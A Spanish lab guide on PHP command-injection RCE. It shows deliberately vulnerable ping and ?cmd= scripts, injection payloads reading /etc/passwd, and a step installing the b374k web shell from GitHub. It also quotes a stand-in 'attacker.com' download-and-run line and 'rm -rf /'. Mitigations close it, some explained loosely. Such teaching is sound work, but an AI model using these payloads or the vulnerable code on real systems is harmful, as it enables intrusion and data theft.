# Actividad - Explotación y Mitigación de Remote Code Execution (RCE).
Tenemos como objetivo:

> - Ver cómo se pueden hacer ataques Remote Code Execution (RCE).
>
> - Analizar el código de la aplicación que permite ataques de Remote Code Execution (RCE).
>
> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.

## ¿Qué es RCE?
---
Los servidores web generalmente brindan a los desarrolladores la capacidad de agregar pequeñas piezas de código dinámico dentro de páginas HTML estáticas, sin tener que lidiar con lenguajes completos del lado del servidor o del lado del cliente. Esta característica es proporcionada por El lado del servidor incluye(SSI).

Server-Side Includes son directivas que el servidor web analiza antes de servir la página al usuario. Representan una alternativa a escribir programas CGI o incrustar código utilizando lenguajes de scripting del lado del servidor, cuando solo se necesitan realizar tareas muy simples. Las implementaciones comunes de SSI proporcionan directivas (comandos) para incluir archivos externos, para establecer e imprimir variables de entorno CGI del servidor web, o para ejecutar scripts CGI externos o comandos del sistema.

SSI puede conducir a una Ejecución de Comando Remoto (RCE), sin embargo, la mayoría de los servidores web tienen el exec directiva desactivada por defecto.

Esta es una vulnerabilidad muy similar a una vulnerabilidad de inyección de lenguaje de scripting clásico. Una mitigación es que el servidor web debe configurarse para permitir SSI. Por otro lado, las vulnerabilidades de inyección SSI son a menudo más fáciles de explotar, ya que las directivas SSI son fáciles de entender y, al mismo tiempo, bastante potentes, por ejemplo, pueden generar el contenido de los archivos y ejecutar comandos del sistema.


Consecuencias de RCE:

• Acceso a información sensible (usuarios, archivos, configuración).

• Ejecución de comandos maliciosos (descarga y ejecución de malware).

• Escalada de privilegios y control total del sistema.

## ACTIVIDADES A REALIZAR
---
> Lee detenidamente la sección de Inyección de comandos de la página de PortWigger <https://portswigger.net/web-security/os-command-injection>

> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionRCE.pdf)

> También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection)


Vamos realizando operaciones:

## Código vulnerable
---
En esta ocación vamos a ver una página en el que tenemos un input para meter una dirección ip.
El programa realizará un ping sobre la dirección que hayamos introducido.
escribimos  rce.php

~~~
<?php
if (isset($_POST['ip'])) {
        $ip = $_POST['ip'];
        // Ejecutar el ping y capturar la salida
        $output = shell_exec("ping -c 4 " . $ip);
        echo $output;
}
?>
<form method="post">
        <input type="text" name="ip" placeholder="Ejemplo: 8.8.8.8" required>
        <button type="submit">Hacer Ping</button>
</form>
~~~

El código permite que el usuario pueda introducir los símbolos ";" "&" y de esta manera podemos ejecutar otros comandos adicionales en el sistema.

## Explotación de RCE
---
Acceder a la URL y ejecutar un comando básico:
~~~
http://localhost/rce.php
~~~

![](images/rce1.png)


Si introducimos una dirección ip se nos muestra si el servidor está accesible

**Ver información del usuario**
Sin embargo podemos anudar consultas con el operador & por ejemplo 
~~~
8.8.8.8 & id
~~~
 que nos mostraría el usuario con el que estamos ejecutando las sentencias php:

![](images/rce2.png)

Si se muestra información del sistema o similar (uid=1000(user) gid=1000(user)), la aplicación es vulnerable.

![](images/rce3.png)

**Intentar listar archivos del servidor:**

Podemos llegar a listar los archivos del directorio donde se encuentra el archivo rce.php con 
~~~
8.8.8.8 & ls
~~~
Si se muestran archivos del sistema en pantalla, el ataque funciona.

![](images/rce4.png)

**Probar más comandos:**

~~~
8.8.8.8 & cat /etc/passwd
~~~

![](images/rce5.png)

Si muestra el contenido de /etc/passwd, el atacante puede extraer credenciales.

**Intentar descargar y ejecutar malware:**

Sólo para nuestro ejemplo dar permisos de escritura a /var/www/html/

Accedemos a nuestro servidor Apache (como lo estamos ejecutando desde un contenedor docker):

~~~
docker exec -it  lamp-php83 /bin/bash
~~~

modificamos los permidos de /var/www/html

~~~
sudo chmod -R 777 /var/www/html/
~~~

Introducimos codigo para concatenar la ip del servidor dns de Google, con descargar el proyecto git b374k: 

~~~
8.8.8.8 & git clone https://github.com/b374k/b374k.git /var/www/html/b374k
~~~

Si lo realiza, estará instalando en el directorio b374k un shell basado en PHP. Luego podremos acceder a él y ejecutar los comandos que queramos.

![](images/rce4.png)

~~~
http://localhost/b374k/index.php
~~~

![](images/rce14.png)

El atacante tiene control total del sistema.

### Mitigaciones de RCE
Para las mitigaciones vamos a utilizar otros archivos: 

Este es el contenido de rce.php
~~~
<?php
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>";
?>
~~~

El archivo rce.php nos va a permitar ejecutar comandos de forma que podemos llamarlo desde otros archivos o bien directamente de la forma:
~~~
http://localhost/rce.php?cmd=cat /etc/passwd
~~~

Por otra parte tenemos el archivo de interfaz que nos va a permitir ejecutar los comandos: **comandos.html** : 

~~~
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejecutar Comando</title>
</head>
<body>
    <h2>Ingrese el comando a ejecutar</h2>
    <form method="get" action="http://localhost/rce.php">
        <input type="text" name="cmd" placeholder="Ejemplo: whoami" required>
        <button type="submit">Ejecutar</button>
    </form>
</body>
</html>
~~~
que lo que hace es crearnos un input para solicitarnos el código a ejecutar y luego, llamar con él, a rce.php.

![](images/rce6.png)

Vamos a modificar rce.php para mitigar las vulnerabilidades.

**Eliminar el uso de shell_exec()**
---
Si la ejecución de comandos no es necesaria, deshabilitar la funcionalidad completamente.

Código seguro (rce.php sin posibilidad de ejecución de comandos ya que se elimina totalmente)

~~~
<?php
die("Esta funcionalidad ha sido deshabilitada por razones de seguridad.");
?>
~~~

_Beneficios:_

- Bloquea cualquier intento de ejecución de código en el sistema.

- Evita ataques RCE de forma definitiva.

- No necesita más medidas de seguridad, ya que la ejecución de comandos es eliminada.

**Restringir Comandos Permitidos**

Si se necesita permitir algunos comandos específicos, usar una lista blanca (whitelist).

Código seguro (rce.php con lista blanca de comandos permitidos)

~~~
<?php
$allowed_cmds = ["ls", "whoami", "pwd"];
if (!isset($_GET['cmd']) || !in_array($_GET['cmd'], $allowed_cmds)) {
        die("Comando no permitido.");
}
$output = shell_exec($_GET['cmd']);
echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
?>
~~~

Permitimos la ejecución de comandos ls, whoami, pwd, el resto dará mensaje de "comando no permitido".


Ante la consulta:

~~~
http://localhost/rce.php?cmd=ls
~~~

si nos permite ejecutar el comando ls

![](images/rce7.png)

Pero sin embargo no nos permite la consulta:

~~~
http://localhost/rce.php?cmd=cat /etc/passwd

~~~
![](images/rce8.png)

_Beneficios:_

- Lista blanca de comandos permite solo los necesarios (ls, whoami, pwd).

- Evita ejecución de comandos peligrosos (rm -rf /, wget, curl, nc).

- Evita XSS con htmlspecialchars(), protegiendo la salida de comandos.

**Ejecutar Comandos con Escapes Seguros**
---

Si se necesita ejecutar comandos con argumentos, usar escapeshellcmd() para evitar inyección de comandos.

Código seguro (rce.php con escapes para argumentos)

~~~
<?php
if (isset($_GET['cmd'])) {
    // Obtener el comando de la URL
    $cmd = $_GET['cmd'];

    // Usar escapeshellarg para proteger la entrada
    $cmd_safe = escapeshellcmd($cmd);

    // Ejecutar el comando de manera segura
    $output = shell_exec($cmd_safe);
    if (empty($output)) {
            echo "Comando no permitido.";
    } else {
        // Mostrar la salida de forma segura
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    }
}
?>
~~~

- Escapa caracteres especiales con escapeshellcmd() para mayor seguridad.

> Si contienen caracteres especiales, exec no va a realizar ninguna consulta, por lo que comprobamos y mostramos aviso de error.
>
> Si queremos que sólo se utilicen comandos simples sin argumentos y sin concatenar, podemos añadir un paso de seguridad con escapeshellarg(). Cambiamos la línea:

~~~
    $cmd_safe = escapeshellarg($cmd);
~~~

Beneficios:

- escapeshellarg() protege argumentos, evitando que se concatenen con ;, &&, |.

- Evita inyección de comandos (wget http://attacker.com/shell.sh && bash shell.sh).

- Mayor flexibilidad, pero más seguro que la ejecución directa de shell_exec().

Ejemplo: Si alguien intenta enviar:

~~~
http://localhost/rce.php?cmd=ping 8.8.8.8; rm -rf /
~~~

La función **escapeshellarg()** convertirá la entrada en:  'ping 8.8.8.8; rm -rf/), eliminará todo el comando y no ejecuta nada. Por eso controlamos cadena vacía.

![](images/rce9.png)

**Deshabilitar shell_exec() en PHP**

Si no se necesita ejecución de comandos en todo el servidor, deshabilitar las funciones peligrosas en php.ini.

Editar php.ini, para ello utilizamos el editor de texto nano (o el que prefiramos) para abrir la configuración de PHP de nuestro contenedor

~~~
docker exec -it lamp-php83 /bin/bash
~~~

Si estamos utilizando la pila LAMP con docker del laborario podemos ver en el archivo de configuración docker-compose.yml que hemos cambiado la ubicación de php:

![](images/rce10.png)

Por lo tanto abrimos el archivo de configuración:

> Aquí una puntualización. Si estamos usando el escenario multicontenedor del entorno de pruebas, podemos ver como en el php.ini tenemos unas configuraciones mínimas, pero tenemos preparados dos ficheros de configuración: php.ini-production y php.ini-development. Si vamos a poner nuestro LAMP o bien en un entorno de producción o de desarrollo deberíamos de renombrar el archivo correspondiente como php.ini para que se establezcan esas configuraciones. Puedes descargarlo aquí el [php.ini](files/php.ini.rce) 
> ![](images/rce11.png)

~~~
sudo nano /usr/local/etc/php/php.ini
~~~

Buscar la línea disable_functions y agregar lo siguiente:

~~~
disable_functions = shell_exec, system, exec, passthru, popen, proc_open
~~~

![](images/rce12.png)

Guardar los cambios y reiniciar Apache para aplicar los cambios

*Beneficios:*
- Bloquea la ejecución de comandos a nivel de servidor, sin necesidad de modificar el código PHP.
- Evita exploits y ejecución remota incluso si rce.php no está mitigado en el código.
- Es la mejor opción si no necesitas ejecutar comandos en PHP.

**Prueba Final**
---

Utilizamos el primer archivo vulnerable que teníamos y probamos intentar obtener el usuario con la URL con cmd=id:

~~~
http://localhost/rce.php?cmd=id
~~~

Si la mitigación funciona, se debería ver el mensaje "Comando no permitido." en pantalla. o en el caso de que utilizamos el entorno de pruebas, el error php:


## ENTREGA

>__Realiza las operaciones indicadas__

>__Crea un repositorio  con nombre PPS-Unidad3Actividad7-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

>__Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__

